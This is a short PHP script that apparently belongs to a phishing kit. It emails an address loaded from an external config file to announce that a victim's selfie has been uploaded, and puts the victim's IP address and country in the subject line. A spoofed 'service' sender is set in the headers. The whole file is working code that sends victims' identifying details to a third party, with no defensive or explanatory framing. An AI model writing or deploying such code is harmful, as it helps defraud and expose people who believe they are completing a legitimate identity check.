<?php

session_start();

include('../../Email.php');


$uploadaaa .= '<h1> check uploads file  </h1>
<h2>NEW SELFIE UPLOADED</h2>
 ';   


$uploads .= '';

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Upload SELFIE  [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: service" . "\r\n";
mail($email, $subject, $uploadaaa , $headers);

?>